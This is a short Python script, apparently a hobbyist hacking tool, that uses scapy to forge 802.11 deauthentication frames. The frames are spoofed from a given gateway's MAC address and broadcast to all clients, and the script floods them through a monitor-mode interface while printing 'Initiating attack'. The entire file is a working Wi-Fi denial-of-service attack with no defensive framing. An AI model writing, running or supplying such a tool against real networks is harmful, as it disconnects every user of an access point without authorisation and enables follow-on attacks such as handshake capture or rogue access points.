from scapy.all import *
import optparse
from termcolor import colored
import time

try:
	print("")
	print(colored("Written by Romeos CyberGypsy","yellow"))
	print(colored("[+] Deauthenticate users from an AP...","blue"))
	print(colored("[-] Your network interface should be in monitor mode","red"))
	print(colored("[-] Run the following command in your terminal: airmon-ng  start <interface_name>", "yellow"))
	print("")
	parser = optparse.OptionParser()
	parser.add_option('-g','--gateway',dest = "gateway", help = "MAC Address of gateway")
	parser.add_option('-i','--interface', dest = "interface", help = "Intended interface to use e.g wlan0")
	parser.add_option('-p','--packets', dest = "packets", help = "Deauthentication packets to throw")

	(values, keys) = parser.parse_args()

	target_mac = "ff:ff:ff:ff:ff:ff"
	gateway_mac = values.gateway #remember to replace this with the MAC of the gateway

	dot11 = Dot11(addr1 = target_mac, addr2 = gateway_mac, addr3 = gateway_mac)

	print(colored("[+] Crafting Dot11 deauth packets...","green"))
	time.sleep(2)
	packet = RadioTap()/dot11/Dot11Deauth(reason = 7)

	print(colored("[+] Initiating attack...","red"))
	time.sleep(2)
	print(colored("[+] Sending deauth packets:","green"))
	time.sleep(1)
	sendp(packet, inter = 0.1, count =int(values.packets), iface = values.interface, verbose =3)

except KeyboardInterrupt:
	print(colored("[!] Exiting safely...","blue"))

except Exception as e:
	print(e)
